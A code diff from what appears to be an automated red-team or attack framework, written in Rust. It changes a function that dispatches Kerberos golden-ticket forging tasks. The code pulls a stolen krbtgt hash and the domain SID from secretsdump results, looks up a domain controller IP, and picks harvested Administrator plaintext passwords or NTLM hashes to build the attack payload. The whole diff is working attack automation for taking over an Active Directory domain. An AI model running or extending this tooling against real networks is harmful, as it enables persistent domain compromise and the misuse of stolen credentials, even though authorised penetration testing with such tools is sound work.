@@ -56,20 +56,64 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             }
         };
 
-        // Check for domain SID
-        let domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();
+        // Require domain SID before dispatching — without it the agent
+        // would need to call get_sid which may fail if only hash creds exist.
+        let domain_sid = match state.domain_sids.get(&domain.to_lowercase()).cloned() {
+            Some(sid) => sid,
+            None => {
+                // SID not cached yet; wait for secretsdump result processing
+                drop(state);
+                continue;
+            }
+        };
+
+        // Look up a DC IP for this domain
+        let dc_ip = state
+            .domain_controllers
+            .get(&domain.to_lowercase())
+            .cloned();
+
+        // Find the best credential for the domain: prefer plaintext, fall back to NTLM hash.
+        let admin_cred = state
+            .credentials
+            .iter()
+            .find(|c| {
+                c.username.to_lowercase() == "administrator"
+                    && c.domain.to_lowercase() == domain.to_lowercase()
+            })
+            .cloned();
+        let admin_hash = state
+            .hashes
+            .iter()
+            .find(|h| {
+                h.username.to_lowercase() == "administrator"
+                    && h.domain.to_lowercase() == domain.to_lowercase()
+                    && h.hash_type.to_uppercase() == "NTLM"
+            })
+            .cloned();
 
         drop(state);
 
         // Submit golden ticket forging task
         let mut payload = json!({
             "technique": "golden_ticket",
+            "vuln_type": "golden_ticket",
             "domain": domain,
             "krbtgt_hash": krbtgt.hash_value,
             "username": "Administrator",
+            "domain_sid": domain_sid,
         });
-        if let Some(sid) = domain_sid {
-            payload["domain_sid"] = json!(sid);
+        if let Some(ip) = dc_ip {
+            payload["dc_ip"] = json!(ip);
+        }
+        if let Some(ref cred) = admin_cred {
+            payload["admin_password"] = json!(cred.password);
+            payload["admin_domain"] = json!(cred.domain);
+        }
+        if let Some(ref hash) = admin_hash {
+            payload["admin_hash"] = json!(hash.hash_value);
+            payload["admin_domain"] =
+                json!(admin_cred.as_ref().map_or(&hash.domain, |c| &c.domain));
         }
         if let Some(ref aes) = krbtgt.aes_key {
             payload["aes_key"] = json!(aes);
